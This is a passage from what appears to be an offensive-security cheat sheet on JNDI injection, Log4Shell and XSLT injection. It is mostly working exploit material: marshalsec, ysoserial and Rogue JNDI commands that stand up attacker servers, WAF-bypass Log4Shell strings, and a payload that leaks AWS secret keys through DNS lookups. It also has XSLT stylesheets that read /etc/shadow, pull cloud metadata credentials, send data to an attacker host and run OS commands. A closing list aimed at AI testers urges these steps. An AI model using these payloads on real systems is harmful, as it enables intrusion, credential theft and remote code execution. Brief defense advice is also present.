Object obj = ctx.lookup(name);  // name = "ldap://attacker.com/Exploit"
```

---

## 2. ATTACK VECTORS

### RMI (Remote Method Invocation)

```
rmi://attacker.com:1099/Exploit
```

Attacker runs an RMI server returning a `Reference` object pointing to a remote class:
```java
// Attacker's RMI server returns:
Reference ref = new Reference("Exploit", "Exploit", "http://attacker.com/");
// JVM downloads http://attacker.com/Exploit.class and instantiates it
```

### LDAP

```
ldap://attacker.com:1389/cn=Exploit
```

Attacker runs an LDAP server returning entries with `javaCodeBase`, `javaFactory`, or serialized object attributes.

LDAP is preferred over RMI because LDAP restrictions were added later (JDK 8u191 vs 8u121 for RMI).

### DNS (detection only)

```
dns://attacker-dns-server/lookup-name
```

Useful for confirming JNDI injection without RCE — triggers DNS query to attacker's authoritative NS.

---

## 3. JDK VERSION CONSTRAINTS AND BYPASS

| JDK Version | RMI Remote Class | LDAP Remote Class | Bypass |
|---|---|---|---|
| < 8u121 | YES | YES | Direct class loading |
| 8u121 – 8u190 | NO (`trustURLCodebase=false`) | YES | Use LDAP vector |
| >= 8u191 | NO | NO | Return serialized gadget object via LDAP |
| >= 8u191 (alternative) | NO | NO | `BeanFactory` + EL injection |

### Post-8u191 Bypass: LDAP → Serialized Gadget

Instead of returning a remote class URL, the attacker's LDAP server returns a **serialized Java object** in the `javaSerializedData` attribute. The JVM deserializes it locally — if a gadget chain (e.g., CommonsCollections) is on the classpath, RCE is achieved.

```bash
# ysoserial JRMPListener approach:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
# Then JNDI lookup points to: rmi://attacker:1099/whatever
```

### Post-8u191 Bypass: BeanFactory + EL

When Tomcat's `BeanFactory` is on the classpath, the LDAP response can reference it as a factory with EL expressions:

```
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

---

## 4. TOOLING

### marshalsec — JNDI Reference Server

```bash
# Start LDAP server serving a remote class:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389

# Start RMI server:
java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/#Exploit" 1099

# The #Exploit refers to Exploit.class hosted at http://attacker.com/Exploit.class
```

### JNDI-Injection-Exploit (all-in-one)

```bash
java -jar JNDI-Injection-Exploit.jar -C "command" -A attacker_ip
# Automatically starts RMI + LDAP servers with multiple bypass strategies
```

### Rogue JNDI

```bash
java -jar RogueJndi.jar --command "id" --hostname attacker.com
# Provides RMI, LDAP, and HTTP servers with auto-generated payloads
```

---

## 5. LOG4J2 — CVE-2021-44228 (LOG4SHELL)

### Mechanism

Log4j2 supports **Lookups** — expressions like `${...}` that are evaluated in log messages. The `jndi` lookup triggers `InitialContext.lookup()`:

```
${jndi:ldap://attacker.com/x}
```

**Any logged string** containing this pattern triggers the vulnerability — User-Agent, form fields, HTTP headers, URL paths, error messages.

### Detection Payloads

```text
${jndi:ldap://TOKEN.collab.net/a}
${jndi:dns://TOKEN.collab.net}
${jndi:rmi://TOKEN.collab.net/a}

# Exfiltrate environment info via DNS:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.TOKEN.collab.net}
${jndi:ldap://${hostName}.TOKEN.collab.net}
```

### WAF Bypass Variants

Log4j2's lookup parser is very flexible:

```text
${${lower:j}ndi:ldap://attacker.com/x}
${${upper:j}${upper:n}${upper:d}i:ldap://attacker.com/x}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/x}
${j${::-n}di:ldap://attacker.com/x}
${jndi:l${lower:D}ap://attacker.com/x}
${${env:NaN:-j}ndi${env:NaN:-:}ldap://attacker.com/x}
```

### Split-Log Bypass (Advanced)

When WAF detects paired `${jndi:...}` in a single request, split across two log entries:

```text
# Request 1 (logged first):
X-Custom: ${jndi:ldap://attacker.com/
# Request 2 (logged second):
X-Custom: exploit}
```

If the application concatenates log entries before re-processing (e.g., aggregation pipelines), the combined `${jndi:ldap://attacker.com/exploit}` triggers.

### Real-World Case: Solr Log4Shell

```bash
# Confirm via DNSLog — Solr admin cores API:
GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.TOKEN.dnslog.cn}
# DNS hit with Java version = confirmed Log4Shell in Solr
```

### Injection Points to Test

```text
User-Agent          X-Forwarded-For       Referer
Accept-Language     X-Api-Version         Authorization
Cookie values       URL path segments     POST body fields
Search queries      File upload names     Form field names
GraphQL variables   SOAP/XML elements     JSON values
```

### Affected Versions

- Log4j2 2.0-beta9 through 2.14.1
- Fixed in 2.15.0 (partial), fully fixed in 2.17.0
- Log4j 1.x is NOT affected (different lookup mechanism)

---

## 6. OTHER JNDI SINKS (BEYOND LOG4J)

| Product / Framework | Sink |
|---|---|
| Spring Framework | `JndiTemplate.lookup()` |
| Apache Solr | Config API, VelocityResponseWriter |
| Apache Druid | Various config endpoints |
| VMware vCenter | Multiple endpoints |
| H2 Database Console | JNDI connection string |
| Fastjson | `@type` + `JdbcRowSetImpl.setDataSourceName()` |

---

## 7. TESTING METHODOLOGY

```
Suspected JNDI injection point?
├── Send DNS-only probe: ${jndi:dns://TOKEN.collab.net}
│   └── DNS hit? → Confirmed JNDI evaluation
│
├── Determine JDK version:
│   └── ${jndi:ldap://${sys:java.version}.TOKEN.collab.net}
│
├── JDK < 8u191?
│   ├── Start marshalsec LDAP server with remote class
│   └── ${jndi:ldap://attacker:1389/Exploit} → direct RCE
│
├── JDK >= 8u191?
│   ├── LDAP → serialized gadget (need gadget chain on classpath)
│   ├── BeanFactory + EL (need Tomcat on classpath)
│   └── JRMPListener via ysoserial
│
└── WAF blocking ${jndi:...}?
    └── Try obfuscation: ${${lower:j}ndi:...}
```

---

## 8. QUICK REFERENCE

```text
# Safe confirmation (DNS only):
${jndi:dns://TOKEN.collab.net}

# LDAP RCE (JDK < 8u191):
${jndi:ldap://ATTACKER:1389/Exploit}

# Version exfiltration:
${jndi:ldap://${sys:java.version}.TOKEN.collab.net}

# Log4Shell with WAF bypass:
${${lower:j}ndi:${lower:l}dap://ATTACKER/x}

# Start LDAP reference server:
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ATTACKER/#Exploit" 1389

# Post-8u191 — ysoserial JRMP:
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "id"
```

---

# Part 5: XSLT Injection

XSLT (Extensible Stylesheet Language Transformations) is a Turing-complete language executed by an XSLT processor (Saxon, Xalan, libxslt, MSXML, Saxonica). When user input lands in an XSLT stylesheet — or, more commonly, when the application fetches/processes an attacker-supplied `.xsl` file — you have RCE-class code execution. It belongs here because the exploit primitives (`document()`, `system-property()`, engine-specific extension functions) are the same shape as SSTI: a template engine resolving attacker-controlled references.

## 1. Non-Obvious Techniques

### 1.1 `document()` — file read / SSRF without extensions

`document()` is part of the XSLT 1.0 spec — every conformant processor implements it. It fetches a URL and parses it as XML. No extension functions needed.

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

For non-XML content use case insensitive text extraction:
```xml
<xsl:value-of select="document('file:///etc/shadow')"/>
```
(file content rendered as text in the output.)

SSRF pivot: `document('http://169.254.169.254/latest/meta-data/')` — and unlike most SSRF sinks, XSLT processors happily resolve `gopher://`, `ftp://`, `dict://` if the underlying URL handler supports them.

### 1.2 `system-property()` — fast fingerprinting

Every processor exposes identity via `system-property()`:
```xml
<xsl:value-of select="system-property('xsl:vendor')"/>     <!-- Saxon, Microsoft, Transformiix, libxslt -->
<xsl:value-of select="system-property('xsl:vendor-url')"/>
<xsl:value-of select="system-property('xsl:version')"/>
```
Vendor identifies the engine — which dictates which RCE gadget (below) will work.

### 1.3 PHP `xsltproc` with `registerPHPFunctions`

PHP's libxslt wrapper exposes PHP functions to XSLT when `XSLTProcessor::registerPHPFunctions()` is enabled:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:value-of select="php:function('system','id')"/>
  </xsl:template>
</xsl:stylesheet>
```
Direct OS command execution. Detection: response header `X-Powered-By: PHP/...`, presence of `libxslt` in error strings.

### 1.4 Java Saxon / Xalan — Java extension RCE

Saxon-HE/EE/PE and Apache Xalan both support instantiating Java classes from XSLT:
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="proc" select="rt:getRuntime()"/>
    <xsl:variable name="out" select="rt:exec($proc,'id')"/>
    <xsl:value-of select="$out"/>
  </xsl:template>
</xsl:stylesheet>
```

Or with Saxon's `system-property` trick:
```xml
<xsl:value-of select="system-property(concat('',document('')))" />
```
(Depending on Saxon version, this can throw an exception that leaks the working directory.)

### 1.5 .NET `Msxml2` / `XslCompiledTransform` — embedded C#

```xml
<msxsl:script language="C#" implements-prefix="user" xmlns:msxsl="urn:schemas-microsoft-com:xslt">
  <msxsl:assembly name="System.Diagnostics, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"/>
  <![CDATA[
    public string cmd(string arg) {
      System.Diagnostics.Process p = new System.Diagnostics.Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + arg;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      return p.StandardOutput.ReadToEnd();
    }
  ]]>
</msxsl:script>
```
Call with `<xsl:value-of select="user:cmd('whoami')"/>`. Works on default `XslCompiledTransform` settings — `EnableScript` must be true, which is the default in many legacy apps.

## 2. Quick payload reference

### 2.1 Universal read (any processor)
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:copy-of select="document('file:///etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

### 2.2 Server fingerprint
```xml
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:vendor-url')"/>
<xsl:value-of select="system-property('xsl:version')"/>
```

### 2.3 SSRF to cloud metadata
```xml
<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
```

### 2.4 Out-of-band exfiltration
```xml
<xsl:copy-of select="document('http://ATTACKER/?d=//secret/key')"/>
```
(URL path carries data; works blind.)

## 3. Realistic entry points

1. **Browser/XSLT rendering features** — Internet Explorer `<?xml-stylesheet?>` PI; legacy intranet apps.
2. **XML-to-HTML / XML-to-PDF pipelines** — invoicing, report generators, document converters.
3. **SOAP attachments with XSLT transforms** — WS-Security signature/encryption transforms.
4. **Office document conversion** — `.docx`/`.odt` → PDF often runs XSLT internally.
5. **Upload + render features** — "upload your XML and we'll style it" tutorials/legacy CMS.
6. **Legacy SAML / XML Signature wrappers** — though most modern IdPs disable XSLT in signature transforms.

## 4. Defense

- Disable `document()` and extension functions:
  - **libxslt (PHP)**: `XSLTProcessor::setSecurityPrefs(XSL_SECPREF_READ_FILE | XSL_SECPREF_WRITE_FILE | XSL_SECPREF_CREATE_DIRECTORY | XSL_SECPREF_READ_NETWORK)` — restricts external resolution.
  - **Java Xalan**: `tfactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);`
  - **Saxon-HE**: `-r` (no network), `-config:config.xml` with `<global externalFunctions="false">`.
  - **.NET XslCompiledTransform**: pass `XsltSettings(false, false)` (disable script, disable document function).
- Never accept user-supplied `.xsl` paths or content.
- Pin XSLT processor version; many old Xalan/Saxon versions have known gadget deserialization via stylesheet params.

## 5. Common AI blind spots

1. **`document()` is in the spec, not an extension.** Secure configurations often disable *extensions* but leave `document()` on, because it's spec-compliant. Always try `document('file:///etc/passwd')` first — it works on a misconfigured default libxslt/Saxon.
2. **`system-property('xsl:vendor')` is your fingerprint primitive.** Use it before choosing a gadget: Saxon → Java gadget; libxslt → PHP/Python; MSXML → .NET `msxsl:script`.
3. **XSLT in XML Signature transforms is rare but real.** Most SAML/XMLDSig libraries disabled it post-2015, but enterprise SSO appliances (Ping, SiteMinder, older Shibboleth) sometimes still process it. Worth testing.
4. **OOB via `document('http://...')` works blind.** Even when the rendered output never reaches you, the URL fetch fires — use a callback host to confirm.
5. **Don't assume XSLT only runs on `.xsl` files.** `.xslt`, `.xsml`, inline `<xsl:stylesheet>` inside an SVG/Office doc, and SOAP XSLT transforms all count.
